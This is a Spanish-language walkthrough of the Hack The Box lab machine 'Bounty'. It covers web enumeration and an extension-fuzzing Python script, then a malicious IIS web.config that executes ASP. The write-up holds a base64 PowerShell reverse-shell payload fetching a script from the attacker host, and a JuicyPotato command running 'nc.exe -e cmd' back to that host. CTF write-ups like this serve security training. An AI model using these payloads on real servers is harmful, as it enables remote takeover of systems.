---
layout: post
title: Bounty
date: 2023-03-29
description:
img:
fig-caption:
tags: [eWPT, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Bounty-htb/Bounty.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Python Scripting - Nivel Medio

* Abuso de web.config en IIS

* Abuso de SeImpersonatePrivilege

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.93 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 09:54 GMT
Nmap scan report for 10.10.10.93
Host is up (0.20s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.53 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80 10.10.10.93 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 09:55 GMT
Nmap scan report for 10.10.10.93
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.93
http://10.10.10.93 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.93], Microsoft-IIS[7.5], Title[Bounty], X-Powered-By[ASP.NET]
```

La página principal se ve así:

<img src="/writeups/assets/img/Bounty-htb/1.png" alt="">

Aplico fuzzing para descubrir archivos y rutas

```null
gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 --add-slash -x asp,aspx
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx,asp
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/29 10:11:20 Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx/       (Status: 200) [Size: 941]
```

Puedo subir un archivo

<img src="/writeups/assets/img/Bounty-htb/2.png" alt="">

Creo un script en python para probar todas las extensiones

```null
#!/usr/bin/python3

from pwn import *
import sys, signal, requests, re, pdb

def def_handler(sig, frame):
    sys.exit(1)

# Variables globales
main_url = "http://10.10.10.93/transfer.aspx/transfer.aspx"
burp = {'http': 'http://localhost:8080'}

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def makeRequests(extension):

    s = requests.session()
    r = s.get(main_url)

    viewstate = re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0]
    eventvalidation = re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    post_data = {
        '__VIEWSTATE': viewstate,
        '__EVENTVALIDATION': eventvalidation,
        'btnUpload': 'Upload'
    }

    fileUpload = {'FileUpload1': ('Test%s' % extension, 'Testing')}

    r = s.post(main_url, data=post_data, files=fileUpload, proxies=burp)

    if "Invalid File. Please try again" not in r.text:
        log.info("Extension %s is valid!!" % extension)


if __name__ == '__main__':

    f = open("/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt", "rb")

    p1 = log.progress("")
    p1.status("Starting...")

    for extension in f.readlines():
        extension = extension.decode().strip()
        p1.status("Testing with %s" % extension)
        makeRequests(extension)
```

```null
python3 extensionfuzz.py
[*] Extension .jpg is valid!!
[*] Extension .gif is valid!!
[*] Extension .jpg is valid!!
[*] Extension .png is valid!!
[*] Extension .doc is valid!!
[*] Extension .config is valid!!
[*] Extension .jpeg is valid!!
[*] Extension .xls is valid!!
[*] Extension .xlsx is valid!!
[*] Extension .docx is valid!!
[*] Extension .doc.doc is valid!!
[*] Extension .jpg.jpg is valid!!
[*] Extension .opml.config is valid!!
[*] Extension .0.jpg is valid!!
[*] Extension .001.l.jpg is valid!!
[*] Extension .002.l.jpg is valid!!
[*] Extension .003.l.jpg is valid!!
[*] Extension .003.jpg is valid!!
[*] Extension .004.l.jpg is valid!!
[*] Extension .004.jpg is valid!!
[*] Extension .006.l.jpg is valid!!
[*] Extension .01-l.jpg is valid!!
[*] Extension .01.jpg is valid!!
[*] Extension .l.jpg is valid!!
[*] Extension .gif is valid!!
[*] Extension .thumb.jpg is valid!!
```

Puedo intentar subir un archivo ```.config``` del IIS. En este [artículo](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/) está todo detallado. Consiste en inyectar código ASP en un comentario

Hay un directorio donde se suben los archivos

```null
gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 --add-slash --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/29 12:43:54 Starting gobuster in directory enumeration mode
===============================================================
/UploadedFiles/       (Status: 403) [Size: 1233]
/uploadedFiles/       (Status: 403) [Size: 1233]
```

Subo el ```web.config``` de prueba

```null
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

```null
curl -s -X GET http://10.10.10.93/uploadedfiles/web.config | html2text
<?xml version="1.0" encoding="UTF-8"?>
webServer>
webServer>  3
```

Como lo interpreta, puedo tratar de enviarme una reverse shell

```null
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAiACkACgA=")
output = cte.StdOut.Readall()
Response.write(output)
%>
```

Gano acceso al sistema

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.93.
Ncat: Connection from 10.10.10.93:49158.
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>
```

Puedo ver la primera flag

```null
PS C:\Users\merlin\Desktop> type user.txt
5f7c31006642d2650846cdf7f61c6fa9
```

# Escalada

Tengo el ```SeImpersonatePrivileage```

```null
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Con ```JuicyPotato``` me convierto en ```nt authority\system```

```null
PS C:\Temp> .\JuicyPotato.exe -t * -p C:\Windows\system32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe -e cmd 10.10.16.2 443"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Puedo ver la segunda flag

```null
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
ad7f3b73bae90e91bd06b0937e7c964c
```